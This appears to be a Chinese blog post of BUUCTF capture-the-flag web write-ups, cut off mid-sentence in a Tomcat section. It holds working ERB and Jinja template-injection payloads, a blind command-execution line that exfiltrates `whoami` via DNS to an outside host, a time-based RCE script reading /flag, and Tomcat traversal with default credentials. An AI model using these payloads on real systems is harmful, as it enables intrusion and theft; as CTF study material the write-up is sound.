<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="buuctf-wp"/>




  <meta name="keywords" content="wp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/04/02/buuctf-wp/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="buuctf-wp">
<meta property="og:url" content="https://glotozz.github.io/2020/04/02/buuctf-wp/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/04/03/Fj6QCRDxbNAsGXJ.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/x5fnyOB8th2zvGi.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/Nf2RE6vGXelOUyA.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/E6F5vVGyoQDYdhR.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/pAu7fLaKm2NWDUv.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/J7xpo3XFNqKUuyS.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/biJyXEVDNrBLmFG.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/LmSRu4fcEXvW8ZD.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/hup76Ka8nRSfB9s.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/szHGSQAyn7weLER.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/nagAFWdTQuUmC8r.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/gkPVxbNFGzUsZrp.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/SAZHRkq671jEVGy.png">
<meta property="og:image" content="https://i.loli.net/2020/04/03/qIrw9RXeLTcYmVW.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/AFEOgWTtdUxVMZP.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/So5rJf6M4Ad2a1H.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/DGPsC8Sv9oZlVBK.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/Mdtm1iqlVuwpS3e.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/TrBQgd87snlKWc9.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/Z6d2enr93xELhYD.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/Lcq9Dki4Txrb6uX.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/luZHzXQ2r4govGq.png">
<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-10_16-19-25.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/R2foi9Uwq4LsKeN.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/cnbIqUS27PLYlNg.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/SD1zpF7GAEX8wM3.png">
<meta property="og:image" content="https://i.loli.net/2020/04/10/6BsSuMCaQxVKmEh.png">
<meta property="article:published_time" content="2020-04-02T13:32:32.000Z">
<meta property="article:modified_time" content="2020-04-10T09:35:37.910Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/04/03/Fj6QCRDxbNAsGXJ.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> buuctf-wp - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          buuctf-wp
        
      </h1>

      <time class="post-time">
          Apr 02 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#sctf2019flag-shop">[SCTF2019]Flag Shop</a></li>
<li><a href="#ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret</a></li>
<li><a href="#rctf2019calcalcalc">[RCTF2019]calcalcalc</a></li>
<li><a href="#wustctf2020train-yourself-to-be-godly">[WUSTCTF2020]Train Yourself To Be Godly</a></li>
<li><a href="#wustctf2020easyweb">[WUSTCTF2020]easyweb</a></li>
<li><a href="#zer0pts2020phpnantokaadm">[Zer0pts2020]phpNantokaAdm</a></li>
<li><a href="#zer0pts2020musicblog">[Zer0pts2020]musicblog</a></li>
<li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
<li><a href="#zer0pts2020urlapp">[Zer0pts2020]urlapp</a></li>
<li><a href="#zer0pts2020notepad">[Zer0pts2020]notepad</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>玩狼人杀输一把刷3道buu哈哈</p>
<hr>
<h4><span id="sctf2019flag-shop">[SCTF2019]Flag Shop</span></h4><p><code>/filebak</code>得到源码</p>
<p>jwt身份验证，</p>
<p>先爆破一下密钥试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJiNjI2YjUyZi05OWYxLTQ1M2YtYjBhYy1iYzg3MTA3NjgwYzIiLCJqa2wiOjIwfQ.oKTH78tthnezEs9RXq5MQPiUIhiLrnUVtONe2yalk_I</span><br></pre></td></tr></table></figure>

<p>果然不行，</p>
<p><img src="https://i.loli.net/2020/04/03/Fj6QCRDxbNAsGXJ.png" alt="Snipaste_2020-04-02_23-37-05.png"></p>
<p>根据源码需要用足够的jkl才能购买flag</p>
<p>这里的考点是erb模版注入读取secret</p>
<p>但是限制了用户输入为7位，但是模版渲染需要<code>&lt;%==&gt;</code>标志，也就是利用两个字符模版注入</p>
<p><img src="https://i.loli.net/2020/04/03/x5fnyOB8th2zvGi.png" alt="Snipaste_2020-04-02_23-50-12.png"></p>
<p><strong>方法一key爆破</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#96;   匹配文本之前的文本</span><br><span class="line">$&#39;   匹配文本之后的文本</span><br></pre></td></tr></table></figure>

<p>利用预定义字符<code>$</code>绕过第一个if判断并读取secret</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;&lt;%&#x3D;$&#39;%&gt;&amp;do&#x3D;&lt;%&#x3D;$&#39;%&gt; is working</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">&#x2F;work?SECRET&#x3D;&amp;name&#x3D;%3c%25%3d%24%27%25%3e&amp;do&#x3D;%3c%25%3d%24%27%25%3e%20is%20working</span><br></pre></td></tr></table></figure>

<p>得到key</p>
<p>再将jkl伪造成<code>1e27</code>，修改cookie购买flag，返回的jwt解码中存入了flag</p>
<p><strong>方法二HTTP参数传递类型差异攻击</strong></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/6686" target="_blank" rel="noopener">https://xz.aliyun.com/t/6686</a> </p>
</blockquote>
<p>举个例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &quot;qwertyu&quot;</span><br><span class="line">$b &#x3D; Array[&quot;bbb&quot;,&quot;cc&quot;,&quot;d&quot;]</span><br><span class="line">puts &quot;$a: #&#123;$a[0,3]&#125;&quot;</span><br><span class="line">puts &quot;$b: #&#123;$b[0,3]&#125;&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;result</span><br><span class="line">$a: qwe</span><br><span class="line">$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">&#x2F;work?SECRET&#x3D;xxx&amp;do&#x3D;%5b%22%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e%22%2c%20%22%31%22%2c%20%22%32%22%2c%20%22%33%22%2c%20%22%34%22%2c%20%22%35%22%2c%20%22%36%22%5d%20%69%73%20%77%6f%72%6b%69%6e%67&amp;name[]&#x3D;%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%70%72%6f%63%2f%73%65%6c%66%2f%65%6e%76%69%72%6f%6e%27%29%2e%72%65%61%64%20%25%3e&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/03/Nf2RE6vGXelOUyA.png" alt="Snipaste_2020-04-03_00-16-00.png"></p>
<p>如果是命令执行没有回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;work?do&#x3D;[&quot;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D;system(&#39;ping -c 1 1&#96;whoami&#96;.evoa.me&#39;)%&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure>



<h4><span id="ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret</span></h4><p>提示secret，访问<code>/secret</code></p>
<p>提示传参secret，传参<code>?secret=aaaaa</code>，大于四位时报错</p>
<p>查看源码</p>
<p><img src="https://i.loli.net/2020/04/03/E6F5vVGyoQDYdhR.png" alt="Snipaste_2020-04-02_21-44-01.png"></p>
<p>明显的ssti，并且这里使用了自定义的RC4加密，具体需要查看<code>rc4_Modified.py</code>文件，这里用<code>%ff</code>可以触发报错</p>
<p><img src="https://i.loli.net/2020/04/03/pAu7fLaKm2NWDUv.png" alt="Snipaste_2020-04-02_22-02-00.png"></p>
<p>搜索一下找到了类似的源码</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/fcfdcc3ff9d5?from=singlemessage" target="_blank" rel="noopener">https://www.jianshu.com/p/fcfdcc3ff9d5?from=singlemessage</a> </p>
</blockquote>
<p>那么构造exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, public_key=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> public_key:</span><br><span class="line">            public_key = <span class="string">'none_public_key'</span></span><br><span class="line">        self.public_key = public_key</span><br><span class="line">        self.index_i = <span class="number">0</span></span><br><span class="line">        self.index_j = <span class="number">0</span></span><br><span class="line">        self._init_box()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_init_box</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        初始化 置换盒</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        key_length = len(self.public_key)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            index = ord(self.public_key[(i % key_length)])</span><br><span class="line">            j = (j + self.Box[i] + index) % <span class="number">256</span></span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_crypt</span><span class="params">(self, string)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        加密/解密</span></span><br><span class="line"><span class="string">        string : 待加/解密的字符串</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> string:</span><br><span class="line">            self.index_i = (self.index_i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            self.index_j = (self.index_j + self.Box[self.index_i]) % <span class="number">256</span></span><br><span class="line">            self.Box[self.index_i], self.Box[self.index_j] = self.Box[self.index_j], self.Box[self.index_i]</span><br><span class="line">            r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">            R = self.Box[r]  <span class="comment"># 生成伪随机数</span></span><br><span class="line">            out.append(chr(ord(s) ^ R))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">payload = <span class="string">"&#123;&#123; config &#125;&#125;"</span></span><br><span class="line">payload = <span class="string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;"</span></span><br><span class="line">print(urllib.parse.quote(a.do_crypt(payload)))</span><br></pre></td></tr></table></figure>

<p> RC4，加密和解密是一样的再加密一次就等于解密 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.%14%19V%A5%09%0Dgl%DD%C5%0E</span><br></pre></td></tr></table></figure>

<p>发现不行， 提示<code>ValueError: chr() arg not in range(256)</code></p>
<p>和一些其他脚本对比分析，初始化置换盒中的代码有点问题</p>
<p><code>self.Box = range(256)</code>应该转化为<code>self.Box = [i for i in range(256)]</code></p>
<p>并且需要使用python3的url编码。</p>
<p>命令执行但是无回显，这里为了方便就简单读取<code>/flag.txt</code></p>
<h4><span id="rctf2019calcalcalc">[RCTF2019]calcalcalc</span></h4><p>使用了拟态的构想，就是将用户输入的参数分别进入三种后端（php,python,nodejs），如果返回值不同则认定无效。</p>
<p>给了三种语言的源码</p>
<p><code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'exec'</span> <span class="keyword">in</span> dir(__builtins__):</span><br><span class="line">        <span class="keyword">del</span> __builtins__.<span class="keyword">exec</span></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">        <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">"0.0.0.0"</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure>

<p><code>index.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">... </span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> Module = <span class="built_in">require</span>(<span class="string">'module'</span>)</span><br><span class="line">    <span class="keyword">const</span> _require = Module.prototype.require</span><br><span class="line">    Module.prototype.require = <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> ([<span class="string">'os'</span>, <span class="string">'child_process'</span>, <span class="string">'vm'</span>, <span class="string">'cluster'</span>].includes(arg)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> _require.call(_require, arg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">  </span><br><span class="line">  process.on(<span class="string">'message'</span>, msg =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> ret = <span class="built_in">eval</span>(msg)</span><br><span class="line">    process.send(ret)</span><br><span class="line">    process.exit(<span class="number">0</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<p>都过滤了各自的一些危险库，其中php设置了<code>disable_function</code></p>
<p>三种服务都在内网中，因此无法外带，可以考虑基于时间延时的RCE，参考<a href="https://skysec.top/2017/12/29/Time-Based-RCE/" target="_blank" rel="noopener">Time_Based_RCE</a></p>
<p>原理类似sql盲注，因为前端会等待后端全部响应完成才继续执行网页</p>
<p><strong>python</strong></p>
<p>可以调用<code>time.sleep(5)</code>产生延时或者<code>set(1 for i in range(10000000))</code></p>
<p>其中第二种的延时较小，数值过大会内存错误</p>
<p>要在三种语言中既能造成延时又不crash，很难找到一个通用的表达式，思路可以找找注释符。</p>
<p><code>//</code>在php和nodejs中表示注释，在python中表示整数除法</p>
<p>大致思路如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x2F;&#x2F;1 and not (ord(open(&#39;&#x2F;flag&#39;).read()[0])&#x3D;&#x3D;1) and __import__(&#39;time&#39;).sleep(5)</span><br></pre></td></tr></table></figure>

<p>再看看前端的限制</p>
<p><img src="https://i.loli.net/2020/04/03/J7xpo3XFNqKUuyS.png" alt="Snipaste_2020-04-03_09-55-17.png"></p>
<p>可以通过json传一个<code>isVip</code>为true绕过，而正则可以通过<code>chr()</code>+拼接字符串的方式绕过</p>
<p>然而并没有延时明显延时</p>
<p><img src="https://i.loli.net/2020/04/03/biJyXEVDNrBLmFG.png" alt="Snipaste_2020-04-03_10-21-21.png"></p>
<p>再分析CTFTime上给的<a href="https://ctftime.org/writeup/15439" target="_blank" rel="noopener">脚本</a>，另一种思路：使用<code>eval()</code>来达到通用的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(__import__(&#39;time&#39;).sleep(5) if ord(open(&#39;&#x2F;flag&#39;).read()[3])&gt;&#x3D;64 else 1)</span><br></pre></td></tr></table></figure>

<p>测试成功</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://39b0719c-b348-4b9c-af1f-8f62ab554bf7.node3.buuoj.cn/calculate'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    print(<span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'eval(%s)'</span> % (<span class="string">'+'</span>.join(<span class="string">'chr(%d)'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(bool_expr)</span>:</span></span><br><span class="line">    payload = <span class="string">"__import__('time').sleep(5) if %s else 1"</span> % bool_expr</span><br><span class="line">    t = time()</span><br><span class="line">    r = requests.post(url, json=&#123;<span class="string">'isVip'</span>: <span class="literal">True</span>, <span class="string">'expression'</span>: encode(payload)&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    delta = time() - t</span><br><span class="line">    print(payload, delta)</span><br><span class="line">    <span class="keyword">return</span> delta &gt; <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(geq_expression, l, r)</span>:</span></span><br><span class="line">    eq_expression = geq_expression.replace(<span class="string">'&gt;='</span>, <span class="string">'=='</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (r - l) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">for</span> mid <span class="keyword">in</span> range(l, r + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> query(eq_expression.format(num=mid)):</span><br><span class="line">                    <span class="keyword">return</span> mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'NOT FOUND'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> query(geq_expression.format(num=mid)):</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag_len = binary_search("len(open('/flag').read())&gt;=&#123;num&#125;", 0, 100)</span></span><br><span class="line">flag_len = <span class="number">50</span></span><br><span class="line">print(<span class="string">'flag length: %d'</span> % flag_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;cef388f4-71a6-41d9-b0c1-3dcd5e3'</span></span><br><span class="line"><span class="keyword">while</span> len(flag) &lt; flag_len:</span><br><span class="line">    c = binary_search(<span class="string">"ord(open('/flag').read()[%d])&gt;=&#123;num&#125;"</span> % len(flag), <span class="number">0</span>, <span class="number">128</span>)</span><br><span class="line">    <span class="keyword">if</span> c:   <span class="comment"># the bs may fail due to network issues</span></span><br><span class="line">        flag += chr(c)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="wustctf2020train-yourself-to-be-godly">[WUSTCTF2020]Train Yourself To Be Godly</span></h4><p> 打开页面是tomcat，影响较大的有三个历史漏洞，这里考的是<strong>弱口令 &amp;&amp; 后台getshell漏洞</strong></p>
<p>利用 <code>..;/</code>可以穿越目录，从而返回上一层，<code>/..;/manager/html</code>进入管理页面，弱密码<code>tomcat:tomcat</code>登录后台，但是直接上传war包由于路径问题导致上传失败。</p>
<p><img src="https://i.loli.net/2020/04/03/LmSRu4fcEXvW8ZD.png" alt="Snipaste_2020-04-03_12-48-56.png"></p>
<p>我们当前目录为<code>examples</code>，少了一个目录穿越<code>/..;/</code>，加上之后返回401，加上基础认证，返回403，即权限不够</p>
<p>查看basic认证的返回包</p>
<p><img src="https://i.loli.net/2020/04/03/hup76Ka8nRSfB9s.png" alt="Snipaste_2020-04-03_11-48-04.png"></p>
<p>发现有一个<code>Path=/manager</code>，</p>
